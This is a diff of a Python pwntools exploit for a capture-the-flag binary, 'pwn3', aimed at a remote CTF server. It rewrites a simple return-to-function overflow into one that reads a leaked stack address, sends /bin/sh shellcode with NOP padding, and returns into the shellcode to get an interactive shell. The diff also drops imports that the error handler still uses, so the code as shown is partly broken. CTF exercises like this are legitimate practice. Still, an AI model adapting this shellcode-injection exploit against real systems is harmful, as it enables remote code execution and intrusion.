@@ -1,24 +1,30 @@
 #!/usr/bin/env python
 
 from pwn import *
-import os
-import sys
-import r2pipe
 
-context.arch = 'i386'
-context.log_level = 'info'
+context.binary = './pwn3'
+context.log_level = logging.WARNING
 
-io = process('./pwn3') 
+PAYLOAD_NIBBLE_SIZE = 242
 
+shellcode = asm(shellcraft.sh())
+payload = shellcode + '\x90' * (PAYLOAD_NIBBLE_SIZE - len(shellcode))
 
-
+#io = process(context.binary.path) 
+io = remote('pwn.ctf.tamu.edu', 4323)
 
 def exploit():
     try:
+	io.recvuntil('Your random number ')
+	return_address = int(io.recv(10), 16)
+
         io.recvuntil('Now what should I echo?')
-        io.send('A' * 243)
-	io.sendline(p32(0x0804854b)) # address to print_flag function
-        io.interactive()
+	
+	io.send(payload)
+	io.sendline(p32(return_address))
+
+	io.interactive()
+
     except Exception as e:
         exc_type, exc_obj, exc_tb = sys.exc_info()
         fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
